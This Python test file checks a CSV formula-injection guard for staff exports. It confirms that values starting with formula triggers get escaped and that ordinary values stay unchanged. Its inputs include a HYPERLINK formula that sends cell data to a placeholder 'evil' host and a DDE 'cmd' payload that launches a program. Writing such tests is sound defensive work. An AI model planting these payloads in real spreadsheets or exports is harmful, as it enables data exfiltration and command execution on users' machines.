"""CSV / formula injection guard for staff exports."""
from app.shared.csv_safety import safe_cell, safe_row


def test_formula_triggers_are_neutralised():
    assert safe_cell('=HYPERLINK("https://evil/?"&C2,"x")').startswith("'=")
    assert safe_cell("@SUM(A1)") == "'@SUM(A1)"
    assert safe_cell("-2+3+cmd|' /C calc'!A0") == "'-2+3+cmd|' /C calc'!A0"
    assert safe_cell("\t=1") == "'\t=1"


def test_plain_values_are_untouched():
    assert safe_cell("+919790177750") == "+919790177750"
    assert safe_cell("-12.5") == "-12.5"
    assert safe_cell("Murugan") == "Murugan"
    assert safe_cell(None) is None
    assert safe_row(["a", "=1", 3]) == ["a", "'=1", 3]


def test_leading_space_and_full_width_equals_are_neutralised():
    assert safe_cell(" =1+1") == "' =1+1"
    assert safe_cell("＝HYPERLINK(1)") == "'＝HYPERLINK(1)"
